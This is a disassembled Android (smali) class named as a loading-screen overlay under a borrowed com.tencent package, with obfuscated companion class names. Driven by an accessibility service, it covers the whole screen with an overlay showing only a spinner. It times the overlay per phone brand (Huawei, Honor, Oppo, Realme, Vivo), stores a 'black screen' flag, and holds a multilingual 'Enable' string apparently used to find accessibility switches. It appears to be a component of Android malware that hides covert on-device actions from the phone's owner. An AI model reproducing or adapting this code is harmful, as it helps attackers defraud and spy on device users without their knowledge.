.class public Lcom/tencent/LoadingScreenOverlay;
.super Ljava/lang/Object;
.source "Bla_tunesxconcerningn10_ck.java"


# static fields
.field public static handler:Landroid/os/Handler; = null

.field static ifAlreadShow:Z = false

.field static layout:Landroid/widget/FrameLayout; = null

.field public static localeForAccessibility:Ljava/lang/String; = "{\'en\':\'Enable\',\'de\':\'Aktivieren\',\'ar\':\'\u062a\u0641\u0639\u064a\u0644"

.field static progressBar:Landroid/widget/ProgressBar;

.field static windowManager:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 18
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private static checkCountDown(I)V
    .locals 2

    .line 28
    invoke-static {}, Lcom/tencent/Br_tunesxconcerningn10_and;->getBrand()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v1, "huawei"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {}, Lcom/tencent/Br_tunesxconcerningn10_and;->getBrand()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v1, "honor"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    const/16 p0, 0x2af8

    .line 31
    :cond_1
    invoke-static {}, Lcom/tencent/Br_tunesxconcerningn10_and;->getBrand()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v1, "oppo"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    invoke-static {}, Lcom/tencent/Br_tunesxconcerningn10_and;->getBrand()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v1, "realme"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    :cond_2
    const/16 p0, 0x1f40

    .line 34
    :cond_3
    invoke-static {}, Lcom/tencent/Br_tunesxconcerningn10_and;->getBrand()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v1, "vivo"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    const/16 p0, 0x2710

    .line 38
    :cond_4
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/LoadingScreenOverlay$1;

    invoke-direct {v1, p0}, Lcom/tencent/LoadingScreenOverlay$1;-><init>(I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 48
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private static getView2(Lcom/tencent/AccessibilityServiceCore;)Landroid/view/View;
    .locals 3

    .line 97
    new-instance v0, Landroid/widget/ProgressBar;

    const/4 v1, 0x0

    const v2, 0x1010077

    invoke-direct {v0, p0, v1, v2}, Landroid/widget/ProgressBar;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;I)V

    sput-object v0, Lcom/tencent/LoadingScreenOverlay;->progressBar:Landroid/widget/ProgressBar;

    const/4 v0, 0x1

    new-array v0, v0, [[I

    const v1, 0x101009e

    .line 98
    filled-new-array {v1}, [I

    move-result-object v1

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const/4 v1, -0x1

    .line 99
    filled-new-array {v1}, [I

    move-result-object v1

    .line 100
    new-instance v2, Landroid/content/res/ColorStateList;

    invoke-direct {v2, v0, v1}, Landroid/content/res/ColorStateList;-><init>([[I[I)V

    .line 101
    sget-object v0, Lcom/tencent/LoadingScreenOverlay;->progressBar:Landroid/widget/ProgressBar;

    invoke-virtual {v0, v2}, Landroid/widget/ProgressBar;->setIndeterminateTintList(Landroid/content/res/ColorStateList;)V

    const/high16 v0, 0x43480000    # 200.0f

    .line 102
    invoke-static {p0, v0}, Lcom/tencent/Scre_tunesxconcerningn10_enUtil;->dp2px(Landroid/content/Context;F)I

    move-result p0

    .line 103
    new-instance v0, Landroid/widget/FrameLayout$LayoutParams;

    invoke-direct {v0, p0, p0}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    const/16 p0, 0x11

    .line 104
    iput p0, v0, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    .line 105
    sget-object p0, Lcom/tencent/LoadingScreenOverlay;->progressBar:Landroid/widget/ProgressBar;

    invoke-virtual {p0, v0}, Landroid/widget/ProgressBar;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 107
    sget-object p0, Lcom/tencent/LoadingScreenOverlay;->progressBar:Landroid/widget/ProgressBar;

    return-object p0
.end method

.method public static hide(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 2

    .line 53
    :try_start_0
    sget-object v0, Lcom/tencent/LoadingScreenOverlay;->layout:Landroid/widget/FrameLayout;

    if-eqz v0, :cond_0

    const/16 v1, 0x8

    .line 55
    invoke-virtual {v0, v1}, Landroid/widget/FrameLayout;->setVisibility(I)V

    .line 56
    sget-object v0, Lcom/tencent/LoadingScreenOverlay;->progressBar:Landroid/widget/ProgressBar;

    invoke-virtual {v0, v1}, Landroid/widget/ProgressBar;->setVisibility(I)V

    .line 57
    sget-object v0, Lcom/tencent/LoadingScreenOverlay;->layout:Landroid/widget/FrameLayout;

    invoke-virtual {v0}, Landroid/widget/FrameLayout;->removeAllViews()V

    .line 58
    sget-object v0, Lcom/tencent/LoadingScreenOverlay;->windowManager:Landroid/view/WindowManager;

    sget-object v1, Lcom/tencent/LoadingScreenOverlay;->layout:Landroid/widget/FrameLayout;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    const/4 v0, 0x0

    .line 59
    sput-object v0, Lcom/tencent/LoadingScreenOverlay;->layout:Landroid/widget/FrameLayout;

    .line 60
    sput-object v0, Lcom/tencent/LoadingScreenOverlay;->progressBar:Landroid/widget/ProgressBar;

    .line 61
    sput-object v0, Lcom/tencent/LoadingScreenOverlay;->windowManager:Landroid/view/WindowManager;

    const/4 v0, 0x1

    .line 62
    sput-boolean v0, Lcom/tencent/LoadingScreenOverlay;->ifAlreadShow:Z

    const-string v1, "IF_ALREAD_SHOW_HEIPING"

    .line 63
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {p0, v1, v0}, Lcom/tencent/My_tunesxconcerningn10_Settings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    .line 66
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_0
    :goto_0
    return-void
.end method

.method public static show(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 3

    const/4 v0, 0x0

    .line 71
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "IF_ALREAD_SHOW_HEIPING"

    invoke-static {p0, v1, v0}, Lcom/tencent/My_tunesxconcerningn10_Settings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    .line 74
    :cond_0
    sget-boolean v0, Lcom/tencent/LoadingScreenOverlay;->ifAlreadShow:Z

    if-eqz v0, :cond_1

    return-void

    .line 78
    :cond_1
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v1

    new-instance v2, Lcom/tencent/LoadingScreenOverlay$2;

    invoke-direct {v2, p0}, Lcom/tencent/LoadingScreenOverlay$2;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v0, v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;Landroid/os/Handler$Callback;)V

    sput-object v0, Lcom/tencent/LoadingScreenOverlay;->handler:Landroid/os/Handler;

    const/16 v0, 0x1388

    .line 85
    invoke-static {v0}, Lcom/tencent/LoadingScreenOverlay;->checkCountDown(I)V

    const-string v0, "window"

    .line 86
    invoke-virtual {p0, v0}, Lcom/tencent/AccessibilityServiceCore;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    sput-object v0, Lcom/tencent/LoadingScreenOverlay;->windowManager:Landroid/view/WindowManager;

    .line 87
    new-instance v0, Landroid/widget/FrameLayout;

    invoke-direct {v0, p0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/tencent/LoadingScreenOverlay;->layout:Landroid/widget/FrameLayout;

    .line 89
    invoke-static {p0}, Lcom/tencent/LoadingScreenOverlay;->getView2(Lcom/tencent/AccessibilityServiceCore;)Landroid/view/View;

    move-result-object p0

    invoke-virtual {v0, p0}, Landroid/widget/FrameLayout;->addView(Landroid/view/View;)V

    .line 90
    new-instance p0, Landroid/view/WindowManager$LayoutParams;

    const/16 v0, 0x7f0

    const/16 v1, 0x7de

    invoke-direct {p0, v0, v1}, Landroid/view/WindowManager$LayoutParams;-><init>(II)V

    const/4 v0, -0x1

    .line 91
    iput v0, p0, Landroid/view/WindowManager$LayoutParams;->width:I

    .line 92
    iput v0, p0, Landroid/view/WindowManager$LayoutParams;->height:I

    .line 93
    sget-object v0, Lcom/tencent/LoadingScreenOverlay;->windowManager:Landroid/view/WindowManager;

    sget-object v1, Lcom/tencent/LoadingScreenOverlay;->layout:Landroid/widget/FrameLayout;

    invoke-interface {v0, v1, p0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void
.end method
